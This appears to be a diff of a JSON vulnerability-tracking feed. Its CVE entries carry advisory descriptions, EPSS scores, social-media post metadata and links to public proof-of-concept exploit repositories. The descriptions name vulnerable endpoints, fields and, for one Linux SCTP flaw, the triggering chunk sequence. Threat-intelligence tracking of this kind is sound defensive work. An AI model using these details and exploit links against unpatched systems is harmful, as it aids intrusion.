@@ -546,7 +546,7 @@
           "header_description": "",
           "followers_count": 2103,
           "following_count": 3,
-          "statuses_count": 9871,
+          "statuses_count": 9875,
           "last_status_at": "2026-08-09",
           "hide_collections": true,
           "show_media": true,
@@ -635,26 +635,26 @@
     ],
     "description": "WordPress is vulnerable to a pre-auth reflected XSS vulnerability on the login screen.\r\n\r\nVia a specially crafted malicious third-party website hosted by an attacker, it is possible for this to be escalated to an RCE vulnerability with conditions outside of the attackers control. This requires successful social engineering of and explicit interaction by the target victim.\r\n\r\nThis issue affects all versions of WordPress. Version 7.0.3 has been released, containing a fix for the vulnerability, and as a courtesy to users on older branches the fix has been backported to all branches back to 4.7.\r\n\r\nDiscovered and responsibly disclosed by [the team at pwn.ai](https://pwn.ai/).",
     "repos": [
-      "https://github.com/ZSecur1ty/XSS2Shell-CVE-2026-64638",
-      "https://github.com/0xBlackash/CVE-2026-64638",
-      "https://github.com/HORKimhab/CVE-2026-64638",
-      "https://github.com/mohwahyudi/poc-CVE-2026-64638-",
-      "https://github.com/yogaGymn/XSS2Shell-CVE-2026-64638",
-      "https://github.com/tc4dy/CVE-2026-64638-PoC-Exploit",
-      "https://github.com/HackSpeak/CVE-2026-64638",
-      "https://github.com/renzi25031469/CVE-2026-64638-WordPress-Core-XSS2Shell",
-      "https://github.com/0xlipon/xss2shell",
-      "https://github.com/686f6c61/POC-WP-XSS2Shell-CVE-2026-64638",
-      "https://github.com/imbas007/CVE-2026-64638-POC",
-      "https://github.com/MR-LeonardoGomes/XSS2Shell-CVE-2026-64638",
-      "https://github.com/jendmaoul/XSS2Shell-CVE-2026-64638",
-      "https://github.com/eh-amish/CVE-2026-64638-XSS-to-Shell-PoC",
-      "https://github.com/5yu4n/CVE-2026-64638",
-      "https://github.com/Dungsocool/CVE-2026-64638",
       "https://github.com/wordsec/XSS2Shell",
-      "https://github.com/4minx/CVE-2026-64638",
+      "https://github.com/imbas007/CVE-2026-64638-POC",
+      "https://github.com/5yu4n/CVE-2026-64638",
+      "https://github.com/ZSecur1ty/XSS2Shell-CVE-2026-64638",
       "https://github.com/Linuxhackingid-official/XSS2Shell-CVE-2026-64638",
-      "https://github.com/Boreas37/CVE-2026-64638-PoC-XSS2Shell-"
+      "https://github.com/4minx/CVE-2026-64638",
+      "https://github.com/HORKimhab/CVE-2026-64638",
+      "https://github.com/Dungsocool/CVE-2026-64638",
+      "https://github.com/yogaGymn/XSS2Shell-CVE-2026-64638",
+      "https://github.com/mohwahyudi/poc-CVE-2026-64638-",
+      "https://github.com/HackSpeak/CVE-2026-64638",
+      "https://github.com/686f6c61/POC-WP-XSS2Shell-CVE-2026-64638",
+      "https://github.com/renzi25031469/CVE-2026-64638-WordPress-Core-XSS2Shell",
+      "https://github.com/jendmaoul/XSS2Shell-CVE-2026-64638",
+      "https://github.com/0xBlackash/CVE-2026-64638",
+      "https://github.com/eh-amish/CVE-2026-64638-XSS-to-Shell-PoC",
+      "https://github.com/Boreas37/CVE-2026-64638-PoC-XSS2Shell-",
+      "https://github.com/tc4dy/CVE-2026-64638-PoC-Exploit",
+      "https://github.com/MR-LeonardoGomes/XSS2Shell-CVE-2026-64638",
+      "https://github.com/0xlipon/xss2shell"
     ],
     "updated": "2026-08-07T19:18:51.610000",
     "epss": 0.766
@@ -956,7 +956,7 @@
           "header": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/115/426/790/034/470/492/original/452fae0b672869b4.png",
           "header_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/115/426/790/034/470/492/original/452fae0b672869b4.png",
           "header_description": "",
-          "followers_count": 54,
+          "followers_count": 55,
           "following_count": 355,
           "statuses_count": 1273,
           "last_status_at": "2026-08-09",
@@ -976,7 +976,7 @@
             {
               "name": "Website",
               "value": "<a href=\"https://cyber.netsecops.io/\" target=\"_blank\" rel=\"nofollow noopener\" translate=\"no\"><span class=\"invisible\">https://</span><span class=\"\">cyber.netsecops.io/</span><span class=\"invisible\"></span></a>",
-              "verified_at": "2026-08-08T16:55:46.402+00:00"
+              "verified_at": "2026-08-09T21:08:58.329+00:00"
             },
             {
               "name": "RSS Feed",
@@ -1238,8 +1238,8 @@
     ],
     "description": "OS Command Injection Remote Code Execution Vulnerability in API in Progress ADC Products allows an un-authenticated attacker to execute arbitrary commands on the LoadMaster appliance by exploiting unsanitized input in multiple command endpoints",
     "repos": [
-      "https://github.com/Caster-chen/CVE-2026-8037-POC",
-      "https://github.com/HORKimhab/CVE-2026-8037"
+      "https://github.com/HORKimhab/CVE-2026-8037",
+      "https://github.com/Caster-chen/CVE-2026-8037-POC"
     ],
     "updated": "2026-08-08T05:17:10.403000",
     "epss": 99.311
@@ -2463,7 +2463,7 @@
           "header_description": "",
           "followers_count": 15,
           "following_count": 0,
-          "statuses_count": 403,
+          "statuses_count": 405,
           "last_status_at": "2026-08-09",
           "hide_collections": null,
           "show_media": true,
@@ -2574,7 +2574,7 @@
           "header_description": "",
           "followers_count": 13,
           "following_count": 0,
-          "statuses_count": 406,
+          "statuses_count": 408,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -2666,7 +2666,7 @@
           "header_description": "",
           "followers_count": 1456,
           "following_count": 0,
-          "statuses_count": 6956,
+          "statuses_count": 6957,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -2700,8 +2700,8 @@
     ],
     "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nsctp: don't free the ASCONF's own transport in DEL-IP processing\n\nsctp_process_asconf() caches the transport the ASCONF chunk is processed\nagainst in asconf->transport (== chunk->transport, set once in sctp_rcv()).\nFor an ASCONF located through its Address Parameter by\n__sctp_rcv_asconf_lookup(), that cached transport corresponds to the\nAddress Parameter, which need not be the packet's source address.\n\nsctp_process_asconf_param() rejects a DEL-IP for the packet source address\n(ADDIP D8, SCTP_ERROR_DEL_SRC_IP), but nothing protects asconf->transport.\nA single ASCONF can therefore carry, in order:\n\n    [Address Parameter L] [DEL-IP L] [DEL-IP 0.0.0.0]\n\nwhere L differs from the source. The DEL-IP for L passes the D8 check and\ncalls sctp_assoc_rm_peer() on the transport that asconf->transport still\npoints at, freeing it (RCU-deferred). The following wildcard DEL-IP then\nreuses the now-dangling asconf->transport in sctp_assoc_set_primary() and\nsctp_assoc_del_nonprimary_peers(): set_primary() dereferences the freed\ntransport (->ipaddr, ->state) and plants the dangling pointer into\nasoc->peer.primary_path / active_path, and del_nonprimary_peers(), keeping\nonly the pointer that is no longer on the list, removes every real\ntransport, leaving the association with a transport_count of 0 and\nprimary_path/active_path pointing at freed memory.\n\nReject a DEL-IP that targets the transport the ASCONF is being processed\nagainst, mirroring the existing source-address guard, so the wildcard\nbranch can never reuse a freed transport.",
     "repos": [
-      "https://github.com/HackSpeak/CVE-2026-64564",
-      "https://github.com/ethanolgolf/CVE-2026-64564"
+      "https://github.com/ethanolgolf/CVE-2026-64564",
+      "https://github.com/HackSpeak/CVE-2026-64564"
     ],
     "updated": "2026-08-09T06:31:34",
     "epss": 0.47600000000000003
@@ -4394,7 +4394,7 @@
     ],
     "description": "Improper limitation of a pathname to a restricted directory ('path traversal') in Application Insights Profiler allows an authorized attacker to elevate privileges over a network.",
     "repos": [],
-    "updated": "2026-08-07T00:31:28",
+    "updated": "2026-08-07T18:17:18.417000",
     "epss": 0.621
   },
   "CVE-2026-56162": {
@@ -4917,7 +4917,7 @@
     ],
     "description": "Deserialization of untrusted data in Azure Service Bus allows an authorized attacker to execute code over a network.",
     "repos": [],
-    "updated": "2026-08-07T00:31:28",
+    "updated": "2026-08-07T18:05:55.493000",
     "epss": 0.91
   },
   "CVE-2026-19189": {
@@ -5161,7 +5161,7 @@
     "epss": 0.12
   },
   "CVE-2025-36852": {
-    "cvss3": null,
+    "cvss3": 0,
     "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
@@ -5189,7 +5189,7 @@
           "header_description": "",
           "followers_count": 176,
           "following_count": 173,
-          "statuses_count": 3766,
+          "statuses_count": 3767,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -5210,9 +5210,9 @@
         "created_at": "2026-08-09T09:20:04.000Z"
       }
     ],
-    "description": "A critical security vulnerability exists in remote cache extensions for common build systems utilizing bucket-based remote cache (such as those using Amazon S3, Google Cloud Storage, or similar object storage) that allows any contributor with pull request privileges to inject compromised artifacts from an untrusted environment into trusted production environments without detection.\u00a0\n\nThe vulnerability exploits a fundamental design flaw in the \"first-to-cache wins\" principle, where artifacts built in untrusted environments (feature branches, pull requests) can poison the cache used by trusted environments (protected branches, production deployments).\u00a0\n\nThis attack bypasses all traditional security measures including encryption, access controls, and checksum validation because the poisoning occurs during the artifact construction phase, before any security measures are applied.",
+    "description": "A critical security vulnerability exists in remote cache extensions for common build systems utilizing bucket-based remote cache (such as those using Amazon S3, Google Cloud Storage, or similar object storage) that allows any contributor with pull request privileges to inject compromised artifacts from an untrusted environment into trusted production environments without detection.\u00a0\n\n\n\n\nThe vulnerability exploits a fundamental design flaw in the \"first-to-cache wins\" principle, where artifacts built in untrusted environments (feature branches, pull requests) can poison the cache used by trusted environments (protected branches, production deployments).\u00a0\n\n\n\n\nThis attack bypasses all traditional security measures including encryption, access controls, and checksum validation because the poisoning occurs during the artifact construction phase, before any security measures are applied.",
     "repos": [],
-    "updated": "2025-10-14T19:17:03",
+    "updated": "2026-06-17T09:14:55.500000",
     "epss": 0.202
   },
   "CVE-2026-19190": {
@@ -5832,7 +5832,7 @@
     ],
     "description": "The TrueBooker \u2013 Appointment Booking and Scheduler System plugin for WordPress is vulnerable to account takeover via improper password reset validation in all versions up to, and including, 1.2.3. This is due to the plugin not properly validating a user's identity before resetting their password. This makes it possible for unauthenticated attackers to reset the password of arbitrary user accounts, including administrators, and gain access to those accounts.",
     "repos": [],
-    "updated": "2026-08-07T06:30:34",
+    "updated": "2026-08-07T18:17:07.627000",
     "epss": 0.28500000000000003
   },
   "CVE-2026-19195": {
@@ -6196,7 +6196,7 @@
     ],
     "description": "A security vulnerability has been detected in UTT HiPER 1200GW up to 2.5.3-170306. This impacts the function strcpy of the file /goform/pptpSrvGlobalConfig. Such manipulation of the argument EncryptionMode leads to stack-based buffer overflow. The attack can be executed remotely. The exploit has been disclosed publicly and may be used. The vendor was contacted early about this disclosure but did not respond in any way.",
     "repos": [],
-    "updated": "2026-08-09T09:30:29",
+    "updated": "2026-08-09T07:17:04.373000",
     "epss": 0.441
   },
   "CVE-2026-67620": {
@@ -6361,7 +6361,7 @@
     "repos": [
       "https://github.com/abdugafforov-bobur/CVE-2026-67620-poc"
     ],
-    "updated": "2026-08-08T16:16:49.420000",
+    "updated": "2026-08-08T18:30:29",
     "epss": 0.426
   },
   "CVE-2026-15038": {
@@ -6547,7 +6547,7 @@
           "header_description": "",
           "followers_count": 178,
           "following_count": 48,
-          "statuses_count": 580,
+          "statuses_count": 582,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -6611,7 +6611,7 @@
           "header_description": "",
           "followers_count": 180,
           "following_count": 48,
-          "statuses_count": 583,
+          "statuses_count": 585,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -6655,10 +6655,10 @@
     ],
     "description": "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core).  Supported versions that are affected are 12.2.1.4.0, 14.1.1.0.0, 14.1.2.0.0 and  15.1.1.0.0. Easily exploitable vulnerability allows low privileged attacker with network access via SAML to compromise Oracle WebLogic Server.  While the vulnerability is in Oracle WebLogic Server, attacks may significantly impact additional products (scope change).  Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.1 Base Score 9.9 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H).",
     "repos": [
+      "https://github.com/0xBlackash/CVE-2026-60206",
       "https://github.com/Debajyoti0-0/CVE-2026-60206",
-      "https://github.com/imbas007/POC-CVE-2026-60206",
       "https://github.com/tc4dy/CVE-2026-60206-PoC-Exploit",
-      "https://github.com/0xBlackash/CVE-2026-60206"
+      "https://github.com/imbas007/POC-CVE-2026-60206"
     ],
     "updated": "2026-07-24T21:32:10",
     "epss": 0.486
@@ -7280,7 +7280,7 @@
     ],
     "description": "MSI Radix AXE6600 router firmware version v781521 contains a command injection vulnerability in the porTrigger function that allows remote attackers to execute arbitrary commands on the affected device. Attackers can exploit this vulnerability through the alg function to execute malicious commands and obtain root privileges on the underlying system.",
     "repos": [],
-    "updated": "2026-08-09T00:31:13",
+    "updated": "2026-08-09T00:16:47.953000",
     "epss": 1.35
   },
   "CVE-2026-21992": {
@@ -7342,9 +7342,9 @@
         "created_at": "2026-08-09T05:15:56.000Z"
       }
     ],
-    "description": "Vulnerability in the Oracle Identity Manager product of Oracle Fusion Middleware (component: REST WebServices) and Oracle Web Services Manager product of Oracle Fusion Middleware (component: Web Services Security).  Supported versions that are affected are 12.2.1.4.0 and  14.1.2.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Identity Manager and Oracle Web Services Manager.  Successful attacks of this vulnerability can result in takeover of Oracle Identity Manager and Oracle Web Services Manager. Note: Oracle Web Services Manager is installed with an Oracle Fusion Middleware Infrastructure. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).",
+    "description": "Vulnerability in the Oracle Identity Manager product of Oracle Fusion Middleware (component: REST WebServices) and Oracle Web Services Manager product of Oracle Fusion Middleware (component: Web Services Security).  Supported versions that are affected are 12.2.1.4.0 and  14.1.2.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Identity Manager and Oracle Web Services Manager.  Successful attacks of this vulnerability can result in takeover of Oracle Identity Manager and Oracle Web Services Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).",
     "repos": [],
-    "updated": "2026-06-17T10:19:19.263000",
+    "updated": "2026-03-20T15:32:14",
     "epss": 1.008
   },
   "CVE-2026-71953": {
@@ -7704,7 +7704,7 @@
     ],
     "description": "D-Link DWR-M961 devices with hardware version C1 and firmware version before 1.1.5_C1_202607071108 contain a command injection vulnerability in the /boafrm/formIMEISetup interface. A remote attacker can inject arbitrary malicious commands into the IMEI_value field, resulting in command execution with root privileges.",
     "repos": [],
-    "updated": "2026-08-08T18:30:29",
+    "updated": "2026-08-08T18:16:55.907000",
     "epss": 2.086
   },
   "CVE-2026-10595": {
@@ -7824,7 +7824,7 @@
     ],
     "description": "A path traversal vulnerability exists in parisneo/lollms version 2.1.0, specifically in the SPA catch-all route implemented in `backend/routers/ui.py`. The vulnerability arises from the improper handling of user-controlled path input, which is directly joined into a filesystem path without sanitization or containment checks. URL-encoded dot-dot sequences (`%2e%2e`) bypass Starlette's built-in path normalization and are resolved by Python's `pathlib`, allowing an unauthenticated attacker to read arbitrary files on the server. This issue has been resolved in version 3.",
     "repos": [],
-    "updated": "2026-08-09T04:17:29.400000",
+    "updated": "2026-08-09T06:31:42",
     "epss": 0.49100000000000005
   },
   "CVE-2026-71990": {
@@ -8344,7 +8344,7 @@
     ],
     "description": "MSI Radix AXE6600 router firmware version v781521 contains a command injection vulnerability in the macfilter function that allows remote attackers to execute arbitrary commands on the affected device. Attackers can exploit the macfilter function to inject malicious commands and obtain root privileges on the underlying system.",
     "repos": [],
-    "updated": "2026-08-09T00:31:13",
+    "updated": "2026-08-09T00:16:48.410000",
     "epss": 1.35
   },
   "CVE-2026-71950": {
@@ -8464,7 +8464,7 @@
     ],
     "description": "D-Link DWR-M961 devices with hardware version C1 and firmware version before 1.1.5_C1_202607071108 contain a command injection vulnerability in the /boafrm/formSmsManage interface. A remote attacker can inject arbitrary malicious commands into the action_value field, resulting in command execution with root privileges.",
     "repos": [],
-    "updated": "2026-08-08T18:16:55.780000",
+    "updated": "2026-08-08T18:30:29",
     "epss": 2.086
   },
   "CVE-2026-71949": {
@@ -8848,7 +8848,7 @@
     "epss": 1.35
   },
   "CVE-2026-11612": {
-    "cvss3": null,
+    "cvss3": 0,
     "severity": null,
     "epss_severity": null,
     "nuclei": null,
@@ -8905,7 +8905,7 @@
     ],
     "description": "Rejected reason: This CVE ID has been rejected or withdrawn by its CVE Numbering Authority.",
     "repos": [],
-    "updated": "2026-08-09T00:31:13",
+    "updated": "2026-08-08T23:16:56.243000",
     "epss": 0
   },
   "CVE-2026-71985": {
@@ -9025,7 +9025,7 @@
     ],
     "description": "MSI Radix AXE6600 router firmware version v781521 contains a command injection vulnerability in the accesscontrol function that allows remote attackers to execute arbitrary commands on the affected device. Attackers can exploit this vulnerability through the accesscontrol function to execute malicious commands and obtain root privileges on the underlying system.",
     "repos": [],
-    "updated": "2026-08-09T00:16:47.360000",
+    "updated": "2026-08-09T00:31:13",
     "epss": 1.35
   },
   "CVE-2026-71984": {
@@ -9405,12 +9405,12 @@
     ],
     "description": "MSI Radix AXE6600 router firmware version v781521 contains a command injection vulnerability in the TelnetSSH function used for Telnet configuration that allows remote attackers to execute arbitrary commands on the affected device. Attackers can exploit this vulnerability through the Telnet configuration interface to inject malicious commands and obtain root privileges on the underlying system.",
     "repos": [],
-    "updated": "2026-08-09T00:31:07",
+    "updated": "2026-08-09T00:16:48.270000",
     "epss": 1.35
   },
   "CVE-2021-26708": {
     "cvss3": 7.0,
-    "severity": "HIGH",
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -9567,11 +9567,11 @@
     ],
     "description": "A local privilege escalation was discovered in the Linux kernel before 5.10.13. Multiple race conditions in the AF_VSOCK implementation are caused by wrong locking in net/vmw_vsock/af_vsock.c. The race conditions were implicitly introduced in the commits that added VSOCK multi-transport support.",
     "repos": [
-      "https://github.com/jordan9001/vsock_poc",
       "https://github.com/kungaocode/vulnerability-analysis-",
-      "https://github.com/azpema/CVE-2021-26708"
+      "https://github.com/azpema/CVE-2021-26708",
+      "https://github.com/jordan9001/vsock_poc"
     ],
-    "updated": "2026-06-17T03:43:41.817000",
+    "updated": "2023-11-18T05:04:48",
     "epss": 1.6019999999999999
   },
   "CVE-2026-71948": {
@@ -9931,7 +9931,7 @@
     ],
     "description": "D-Link DWR-M961 devices with hardware version C1 and software version 1.1.2_C1_202602110044 contain a buffer overflow vulnerability in the quicksetup.cgi interface. A remote attacker can write overly long strings to the test4, ssid2, and username fields and execute arbitrary commands by crafting a specific payload, or cause the device to crash.",
     "repos": [],
-    "updated": "2026-08-08T18:30:30",
+    "updated": "2026-08-08T18:16:56.783000",
     "epss": 0.562
   },
   "CVE-2026-71957": {
@@ -10051,7 +10051,7 @@
     ],
     "description": "D-Link DWR-M961 devices with hardware version C1 and software version 1.1.2_C1_202602110044 contain a buffer overflow vulnerability in the app.cgi interface. A remote attacker can write an overly long string to the netAcc.addlist[].name field and execute arbitrary commands by crafting a specific payload, or cause the device to crash.",
     "repos": [],
-    "updated": "2026-08-08T18:16:56.647000",
+    "updated": "2026-08-08T18:30:29",
     "epss": 0.594
   },
   "CVE-2026-71956": {
@@ -10291,7 +10291,7 @@
     ],
     "description": "MSI Radix AXE6600 router firmware version v781521 contains a command injection vulnerability in the wps.cgi interface that allows remote attackers to execute arbitrary commands by injecting malicious input through the pin2g, pin5g, or pin6g parameters. Attackers can exploit these unsanitized parameters to execute arbitrary commands on the affected device and obtain root privileges.",
     "repos": [],
-    "updated": "2026-08-09T00:31:13",
+    "updated": "2026-08-08T23:16:56.967000",
     "epss": 1.6209999999999998
   },
   "CVE-2026-64221": {
@@ -10323,7 +10323,7 @@
           "header_description": "",
           "followers_count": 19,
           "following_count": 23,
-          "statuses_count": 204,
+          "statuses_count": 205,
           "last_status_at": "2026-08-09",
           "hide_collections": true,
           "show_media": true,
@@ -10366,8 +10366,8 @@
     "epss": 0.126
   },
   "CVE-2026-61808": {
-    "cvss3": 9.8,
-    "severity": "CRITICAL",
+    "cvss3": 0,
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -10490,9 +10490,9 @@
         "created_at": "2026-08-07T23:00:53.000Z"
       }
     ],
-    "description": "LightRAG provides simple and fast retrieval-augmented generation. Through version 1.5.4, the LightRAG API server binds to all network interfaces with authentication disabled by default, allowing an unauthenticated network attacker to read indexed document content, upload or delete documents, modify the knowledge graph, cancel pipelines, clear caches, and consume LLM resources. This issue is mitigated in version 1.5.5rc1.",
+    "description": "N/A",
     "repos": [],
-    "updated": "2026-08-07T20:16:52.007000",
+    "updated": null,
     "epss": 0.345
   },
   "CVE-2026-65400": {
@@ -10578,7 +10578,7 @@
           "header_description": "",
           "followers_count": 32,
           "following_count": 1,
-          "statuses_count": 25887,
+          "statuses_count": 25888,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -10705,6 +10705,79 @@
     "updated": "2026-08-07T03:31:32",
     "epss": 0.304
   },
+  "CVE-2026-15409": {
+    "cvss3": 10.0,
+    "severity": "CRITICAL",
+    "epss_severity": "CRITICAL",
+    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/f1af193f36b86dfaa66da05ca3ec2dc05778a728/javascript/cves/2026/CVE-2026-15409.yaml",
+    "posts": [
+      {
+        "account": {
+          "id": "112724700719188638",
+          "username": "jerry",
+          "acct": "jerry@defensivesecurity.org",
+          "display_name": "jerry",
+          "locked": false,
+          "bot": false,
+          "discoverable": true,
+          "indexable": true,
+          "group": false,
+          "created_at": "2017-01-15T00:00:00.000Z",
+          "note": "",
+          "url": "https://defensivesecurity.org/author/jerry/",
+          "uri": "https://defensivesecurity.org/author/jerry/",
+          "avatar": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/112/724/700/719/188/638/original/988d2662e37affbd.png",
+          "avatar_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/112/724/700/719/188/638/original/988d2662e37affbd.png",
+          "avatar_description": "",
+          "header": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/112/724/700/719/188/638/original/24925c6f6be51665.png",
+          "header_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/112/724/700/719/188/638/original/24925c6f6be51665.png",
+          "header_description": "",
+          "followers_count": 17,
+          "following_count": 0,
+          "statuses_count": 96,
+          "last_status_at": "2026-08-08",
+          "hide_collections": true,
+          "show_media": true,
+          "show_media_replies": true,
+          "show_featured": true,
+          "feature_approval": {
+            "automatic": [
+              "disabled"
+            ],
+            "manual": [],
+            "current_user": "denied"
+          },
+          "emojis": [],
+          "fields": [
+            {
+              "name": "Profile",
+              "value": "<p><a rel=\"nofollow noopener\" title=\"https://defensivesecurity.org/author/jerry/\" href=\"https://defensivesecurity.org/author/jerry/\" target=\"_blank\">defensivesecurity.org</a></p>",
+              "verified_at": null
+            },
+            {
+              "name": "Blog",
+              "value": "<p><a rel=\"nofollow noopener\" title=\"https://defensivesecurity.org/\" href=\"https://defensivesecurity.org/\" target=\"_blank\">defensivesecurity.org</a></p>",
+              "verified_at": null
+            }
+          ]
+        },
+        "url": "https://defensivesecurity.org/defensive-security-podcast-episode-354-2/",
+        "content": "<h2>Defensive Security Podcast Episode 355</h2>\n\n <a href=\"https://media.blubrry.com/1463551/content.blubrry.com/1463551/Defensive_Security_Podcast_Episode_355.mp3\" rel=\"nofollow noopener\" target=\"_blank\">https://media.blubrry.com/1463551/content.blubrry.com/1463551/Defensive_Security_Podcast_Episode_355.mp3</a> <p>Podcast: <a href=\"https://media.blubrry.com/1463551/content.blubrry.com/1463551/Defensive_Security_Podcast_Episode_355.mp3\" class=\"\" title=\"Play in new window\" rel=\"nofollow noopener\" target=\"_blank\">Play in new window</a> | <a href=\"https://media.blubrry.com/1463551/content.blubrry.com/1463551/Defensive_Security_Podcast_Episode_355.mp3\" class=\"\" title=\"Download\" rel=\"nofollow noopener\" target=\"_blank\">Download</a> | Embed</p><p></p><p>Subscribe: <a href=\"https://defensivesecurity.org/feed/podcast/\" class=\"\" title=\"Subscribe via RSS\" rel=\"nofollow noopener\" target=\"_blank\">RSS</a></p><p><a href=\"https://www.youtube.com/watch?v=LL0ez4JXGWE\" rel=\"nofollow noopener\" target=\"_blank\">https://www.youtube.com/watch?v=LL0ez4JXGWE</a></p><p><a href=\"https://www.helpnetsecurity.com/2026/07/21/sonicwall-sma-zero-days-exploited-cve-2026-15409-cve-2026-15410/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">helpnetsecurity.com/2026/07/21</span><span class=\"invisible\">/sonicwall-sma-zero-days-exploited-cve-2026-15409-cve-2026-15410/</span></a><br><a href=\"https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">thehackernews.com/2026/07/qili</span><span class=\"invisible\">n-ransomware-attackers-exploit-pan.html</span></a><br><a href=\"https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">thehackernews.com/2026/07/worl</span><span class=\"invisible\">ds-largest-ai-model-repository.html</span></a><br><a href=\"https://openai.com/index/hugging-face-model-evaluation-security-incident/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"ellipsis\">openai.com/index/hugging-face-</span><span class=\"invisible\">model-evaluation-security-incident/</span></a><br><a href=\"https://www.darkreading.com/identity-access-management-security/identity-attacks-overtake-exploits-top-ransomware-cause\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">darkreading.com/identity-acces</span><span class=\"invisible\">s-management-security/identity-attacks-overtake-exploits-top-ransomware-cause</span></a><br><a href=\"https://www.helpnetsecurity.com/2026/07/21/estee-lauder-data-breach-oracle-ebs/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">helpnetsecurity.com/2026/07/21</span><span class=\"invisible\">/estee-lauder-data-breach-oracle-ebs/</span></a></p>\n\n",
+        "created_at": "2026-08-08T19:16:44.000Z"
+      }
+    ],
+    "description": "A Server-side request forgery (SSRF) vulnerability has been identified in the SMA1000 Appliance Work Place interface. A remote unauthenticated attacker could potentially cause the appliance to make requests to unintended location.",
+    "repos": [
+      "https://github.com/MrRawBit/SonicWall-SMA1000-Zero-Day-IoC-Check",
+      "https://github.com/tc4dy/CVE-2026-15409-15410-Framework",
+      "https://github.com/Ch4120N/CVE-2026-15409",
+      "https://github.com/remmons-r7/rapid7-CVE-2026-15409",
+      "https://github.com/0xBlackash/CVE-2026-15409",
+      "https://github.com/HORKimhab/CVE-2026-15409"
+    ],
+    "updated": "2026-07-16T05:16:18.293000",
+    "epss": 78.44
+  },
   "CVE-2026-15410": {
     "cvss3": 7.2,
     "severity": "HIGH",
@@ -10774,79 +10847,6 @@
     ],
     "updated": "2026-07-14T21:32:21",
     "epss": 76.347
-  },
-  "CVE-2026-15409": {
-    "cvss3": 10.0,
-    "severity": "CRITICAL",
-    "epss_severity": "CRITICAL",
-    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/f1af193f36b86dfaa66da05ca3ec2dc05778a728/javascript/cves/2026/CVE-2026-15409.yaml",
-    "posts": [
-      {
-        "account": {
-          "id": "112724700719188638",
-          "username": "jerry",
-          "acct": "jerry@defensivesecurity.org",
-          "display_name": "jerry",
-          "locked": false,
-          "bot": false,
-          "discoverable": true,
-          "indexable": true,
-          "group": false,
-          "created_at": "2017-01-15T00:00:00.000Z",
-          "note": "",
-          "url": "https://defensivesecurity.org/author/jerry/",
-          "uri": "https://defensivesecurity.org/author/jerry/",
-          "avatar": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/112/724/700/719/188/638/original/988d2662e37affbd.png",
-          "avatar_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/112/724/700/719/188/638/original/988d2662e37affbd.png",
-          "avatar_description": "",
-          "header": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/112/724/700/719/188/638/original/24925c6f6be51665.png",
-          "header_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/112/724/700/719/188/638/original/24925c6f6be51665.png",
-          "header_description": "",
-          "followers_count": 17,
-          "following_count": 0,
-          "statuses_count": 96,
-          "last_status_at": "2026-08-08",
-          "hide_collections": true,
-          "show_media": true,
-          "show_media_replies": true,
-          "show_featured": true,
-          "feature_approval": {
-            "automatic": [
-              "disabled"
-            ],
-            "manual": [],
-            "current_user": "denied"
-          },
-          "emojis": [],
-          "fields": [
-            {
-              "name": "Profile",
-              "value": "<p><a rel=\"nofollow noopener\" title=\"https://defensivesecurity.org/author/jerry/\" href=\"https://defensivesecurity.org/author/jerry/\" target=\"_blank\">defensivesecurity.org</a></p>",
-              "verified_at": null
-            },
-            {
-              "name": "Blog",
-              "value": "<p><a rel=\"nofollow noopener\" title=\"https://defensivesecurity.org/\" href=\"https://defensivesecurity.org/\" target=\"_blank\">defensivesecurity.org</a></p>",
-              "verified_at": null
-            }
-          ]
-        },
-        "url": "https://defensivesecurity.org/defensive-security-podcast-episode-354-2/",
